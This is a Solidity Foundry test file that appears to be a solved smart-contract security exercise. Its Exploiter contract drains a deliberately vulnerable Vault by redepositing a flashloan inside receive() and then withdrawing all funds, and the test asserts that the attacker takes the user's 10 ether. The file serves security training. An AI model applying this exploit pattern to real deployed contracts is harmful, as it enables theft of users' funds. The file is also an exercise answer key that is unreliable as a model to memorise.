// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/03-Flashloan.sol";

contract CallerTest is Test {
    Vault public vault;

    function setUp() public {
        vault = new Vault();

        address user = makeAddr("USER");
        hoax(user);
        vault.deposit{value: 10 ether}();
    }

    function test_Flashloan() public {
        address attacker = makeAddr("ATTACKER");
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // START OF SOLUTION
        // (You can create any additional contract if needed)

        Exploiter exploiter = new Exploiter(vault);
        exploiter.exploit();
        exploiter.withdraw();

        // END OF SOLUTION

        uint256 vaultBalance = address(vault).balance;
        assertEq(vaultBalance, 0, "Vault still has balance");

        uint256 attackerBalance = address(attacker).balance;
        assertEq(attackerBalance, 11 ether, "Attacker didn't get the assets");
    }
}

contract Exploiter {
    Vault public vault;
    bool exploited;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function exploit() public {
        vault.flashloan(10 ether);
    }

    function withdraw() external {
        vault.withdraw();
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer failed");
    }

    receive() external payable {
        if (!exploited) {
            exploited = true;
            vault.deposit{value: 10 ether}();
        }
    }
}
